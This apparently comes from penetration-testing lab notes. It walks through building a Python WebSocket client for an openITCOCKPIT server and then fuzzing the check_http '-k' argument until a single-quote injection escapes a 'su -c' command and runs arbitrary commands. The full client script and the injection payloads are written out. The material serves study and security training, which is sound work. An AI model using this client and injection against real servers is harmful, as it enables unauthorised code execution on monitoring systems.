## Interacting With Server

First, we'll start by building a client that can interact with the WebSocket.
For this script, we will start by importing a few modules, and setting a few global variables.

Next up, we will set up the arguments, that we'll pass into the script from the command line.
The arguments would be:

1. url - Configure the url of the WebSocket connection
2. key - Configure the key for the WebSocket connection
3. verbose - For verbose output for debugging

The global variables would be the key and the url variables, which will be passed as the argument.
Next, we will configure verbose tracing if the argument is set, then we will configure the connection.

We will be defining 4 function inside our code:
1. on_message
2. on_error
3. on_close
4. on_open

**on\_open function**
The on_open function will access the WebSocket connection as an argument.
Because we want the connection to stay open, but still allow the server to send us messages at any time, we will create a separate thread.
The new thread will execute the _run_ function, which will be defined inside the on_open function.
Inside of run, we will have a loop that will run non-stop to listen for user input.
The user's input will then be converted to the appropriate JSON and passed to the send function for the WebSocket connection.

**toJson function**
Before continuing, we will replicate the toJson function from the source code.
This function will accept the task and the data we want to send.
The function will create a dictionary that contains the task, data, uniqid and key variables. the function will then return the json dump stings.

**on\_message function**
This function will take the WebSocket connection and the passed message as the arguments.
The function will set the uniqid global variable, if the server sends one, and print the raw message.

**on\_error and on\_close functions**
on\_error function will simply print the error.
on\_close function will just print the message that t he connection was closed.

The final script will look like so:

```python
##import neccessary modules##
import websocket
import ssl 
import json
import argparse
import _thread as thread

##set global variables##
uniqid = ""
key = ""

##define on_open function that takes the websocket connection as the argument##
def on_open(ws):
    ##define the run function that will allow the server to send us a message any time even when the connection is open##
    def run():
        while True:
            ##Listen for user input non stop##
            cmd = input()
            ##convert user input to appropriate JSON and pass it to send function##
            ws.send(toJson("execute_nagios_command", cmd))
    ##run a thread in the background to execute the run function##
    thread.start_new_thread(run, ())

##define the toJson function##
def toJson(task,data):
    ##mirror the function from the source code##
    req = {
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key" : key
    }
    ##run the dictionary through dumps function to dump it as a JSON string##
    return json.dumps(req)

##define the on_message function##
def on_message(ws, message):
    ##parse the message##
    mes = json.loads(message)

    ##set the global variable##
    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]

    ##clean up the output
    if mes["type"] == "connection":
        print("[+] Connected!")
    elif mes['type'] == "dispatcher":
        pass
    elif mes["type"] == "response":
        print(mes["payload"], end = '')
    else:
        ##print the message if all conditions are passed##
        print(mes)

##define the on_error function##
def on_error(ws, error):
    print(error)

##define the on_close function##
def on_close(ws):
    print("[+] Connection Closed")

##Create arguements##
if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument('--url', '-u',
                        required=True,
                        dest='url',
                        help='Websocket URL')
    parser.add_argument('--key', '-k',
                        required=True,
                        dest='key',
                        help='openITCOCKPIT Key')
    parser.add_argument('--verbose', '-v',
                        help='Print more data',
                        action='store_true')
    args = parser.parse_args()

    ##set the global key variable##
    key = args.key
    ##enable verbose output##
    websocket.enableTrace(args.verbose)
    ##Create websocket connection and pass in the created functions##
    ws = websocket.WebSocketApp(args.url,
                              on_message = on_message,
                              on_error = on_error,
                              on_close = on_close,
                              on_open = on_open)
    ##Ignore the self-signed cert and connect continuously to the client##
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
```

Executing the script, we create the connection, and send our payload "whoami":

![](../../03.%20Images/t7-ss32.png)

First, upon initial connection, the server sends a message with a type of "connection" and a payload of "Connection established".
Next, in response to the whoami command, the server _response_ contains "Forbidden command!"
Finally, the server periodically sends a _dispatcher_ message without a payload.

We will edit our on\_message function, and clean up the output:
```
def on_message(ws, message):
    mes = json.loads(message)

    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]
    
    if mes["type"] == "connection":
        print("[+] Connected!")
    elif mes["type"] == "dispatcher":
        pass
    elif mes["type"] == "response":
        print(mes["payload"], end = '')
    else:
        print(mes)
```

With this, even though we can only execute a few commands, we still have achieved partial code execution.

## Achieving full code execution

We are able to run only a few commands such as "ls" to list the working directory. All files discovered are interesting, but the most interesting one the check_http file:

![](../../03.%20Images/t7-ss33.png)

We can run this script to get more information:
![](../../03.%20Images/t7-ss34.png)

Reviewing the usage instructions for check_http, reveals that it allows us to inject custom headers with the -k argument.
The ability to inject custom headers into a request is useful as it might provide us a blank slate to interact with local services that are not HTTP-based.
This is only possible if we can set the IP address of the command to 127.0.0.1, can set the port to any value, and can set the header to any value we want.

To check how much control we have, we can setup a netcat listener, and execute the script:

![](../../03.%20Images/t7-ss35.png)

The listener displays the data that was received from the connection.

Next up, we will use the -k argument to send a string:

![](../../03.%20Images/t7-ss36.png)

As we our fuzzing, we can put our string in double quotes and see what happens:

![](../../03.%20Images/t7-ss37.png)

We notice that the first quote is escaped and sent and the second part of the header is included in the Host header.
This means that we are escaping some quotes, and injecting commands somewhere else.

We will do the same, but this time with a single quote:

![](../../03.%20Images/t7-ss38.png)

This time our second string is not shown at all.

Our enumeration is:
1. Sending a string with double quotes escapes the double quote and the value after the space is treated as a parameter to the Host header.
2. Sending a single quote, the quote is not escaped and the second string is not included at all.
3. An inconsistency of this type generally suggests that we are injecting an unexpected character.

Our conclusion is:
1. When using a single quote we might be injecting our second string as another command or an argument.

To test the validity of this conclusion, we will send a single quote payload, with the second string being "--help", to display help of the command being used:

![](../../03.%20Images/t7-ss39.png)

The --help string, shows the help menu of the su command.
We can now safely conclude, that the web application is running some whitelisted commands through the WebSocket, through some command as follows:

```bash
su someuser -c './check_http -I 192.168.119.120 -p 8080 -k 'test --help''
```

Thus, if we inject a command like so:

```bash
./check_http -I 192.168.119.120 -p 8080 -k 'test -c 'echo 'hacked'
```

We should be able to achieve command execution:

![](../../03.%20Images/t7-ss40.png)

With this, we have achieved code execution, and can now proceed to get a shell.